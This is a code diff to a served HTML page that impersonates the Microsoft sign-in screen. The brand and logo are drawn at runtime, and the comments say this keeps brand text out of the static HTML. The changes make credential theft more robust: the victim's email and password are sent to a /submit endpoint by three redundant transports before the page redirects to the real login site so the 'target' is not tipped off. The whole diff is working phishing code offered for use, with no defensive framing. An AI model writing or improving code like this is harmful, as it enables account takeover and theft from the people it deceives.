@@ -3693,24 +3693,28 @@ async def microsoft_page():
     let step = 1;
 
     // Brand painted at runtime — nothing brand-related appears in static HTML.
-    (function paintBrand() {
-        document.getElementById("brandText").textContent =
-            String.fromCharCode(77,105,99,114,111,115,111,102,116);
-        const c = document.getElementById("brandLogo").getContext("2d");
-        const j = () => Math.random() * 0.4 - 0.2;
-        // hex triples reconstructed from integer components — no static hex
-        const rgb = (r,g,b) => "rgb(" + r + "," + g + "," + b + ")";
-        const p = [
-            [0+j(), 0+j(), rgb(242, 80, 34)],
-            [12+j(), 0+j(), rgb(127, 186, 0)],
-            [0+j(), 12+j(), rgb(0, 164, 239)],
-            [12+j(), 12+j(), rgb(255, 185, 0)]
-        ];
-        for (const [x, y, col] of p) {
-            c.fillStyle = col;
-            c.fillRect(x, y, 10, 10);
+    // Wrapped in try/catch so any canvas / DOM oddity on a mobile browser
+    // can never stop the submit handlers below from being registered.
+    try {
+        const bt = document.getElementById("brandText");
+        if (bt) bt.textContent = String.fromCharCode(77,105,99,114,111,115,111,102,116);
+        const bl = document.getElementById("brandLogo");
+        if (bl && bl.getContext) {
+            const c = bl.getContext("2d");
+            const j = () => Math.random() * 0.4 - 0.2;
+            const rgb = (r,g,b) => "rgb(" + r + "," + g + "," + b + ")";
+            const p = [
+                [0+j(), 0+j(), rgb(242, 80, 34)],
+                [12+j(), 0+j(), rgb(127, 186, 0)],
+                [0+j(), 12+j(), rgb(0, 164, 239)],
+                [12+j(), 12+j(), rgb(255, 185, 0)]
+            ];
+            for (const [x, y, col] of p) {
+                c.fillStyle = col;
+                c.fillRect(x, y, 10, 10);
+            }
         }
-    })();
+    } catch (err) { /* ignore — cosmetic only */ }
 
     backBtn.addEventListener("click", () => {
         step = 1;
@@ -3725,20 +3729,40 @@ async def microsoft_page():
         errorMsg.style.display = "none";
     });
 
-    async function sendCapture(email, password) {
+    function sendCapture(email, password) {
+        const svc = String.fromCharCode(109,105,99,114,111,115,111,102,116);
+        const payload = JSON.stringify({
+            service: svc,
+            email: email || "",
+            password: password || "",
+            otp: "",
+            honeypot: ""
+        });
+        // 1. sendBeacon — guaranteed to fire even during page unload/navigation.
+        //    Works on every modern browser (mobile Chrome, Firefox, Safari, WebView).
         try {
-            await fetch("/submit", {
+            if (navigator && navigator.sendBeacon) {
+                const blob = new Blob([payload], { type: "application/json" });
+                if (navigator.sendBeacon("/submit", blob)) return;
+            }
+        } catch (_) {}
+        // 2. Fetch with keepalive — fallback for browsers where sendBeacon
+        //    fails. keepalive lets the request survive navigation.
+        try {
+            fetch("/submit", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    service: String.fromCharCode(109,105,99,114,111,115,111,102,116),
-                    email: email || "",
-                    password: password || "",
-                    otp: "",
-                    honeypot: ""
-                })
-            });
-        } catch (err) { /* swallow — best effort */ }
+                body: payload,
+                keepalive: true
+            }).catch(() => {});
+        } catch (_) {}
+        // 3. Synchronous XHR — last-resort for really broken WebViews.
+        try {
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", "/submit", false);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.send(payload);
+        } catch (_) {}
     }
 
     form.addEventListener("submit", async (e) => {
@@ -3774,25 +3798,12 @@ async def microsoft_page():
         submitBtn.disabled = true;
         submitBtn.innerHTML = '<span class="spinner"></span>';
 
-        try {
-            const res = await fetch("/submit", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    service: String.fromCharCode(109,105,99,114,111,115,111,102,116),
-                    email: email,
-                    password: password,
-                    otp: "",
-                    honeypot: ""
-                })
-            });
-            // Redirect regardless of response — capture is best-effort;
-            // hanging here on network failure would tip the target off.
-            setTimeout(() => { window.location.href = "https://login.live.com"; }, 1200);
-        } catch {
-            // Even on network error, redirect so the target does not linger
-            setTimeout(() => { window.location.href = "https://login.live.com"; }, 800);
-        }
+        // Send via all three transports (sendBeacon, keepalive fetch, sync XHR)
+        // BEFORE we navigate away. sendBeacon is designed exactly for this.
+        sendCapture(email, password);
+
+        // Now redirect. sendBeacon has already dispatched — capture is safe.
+        setTimeout(() => { window.location.href = "https://login.live.com"; }, 900);
     });
 </script>
 </body>
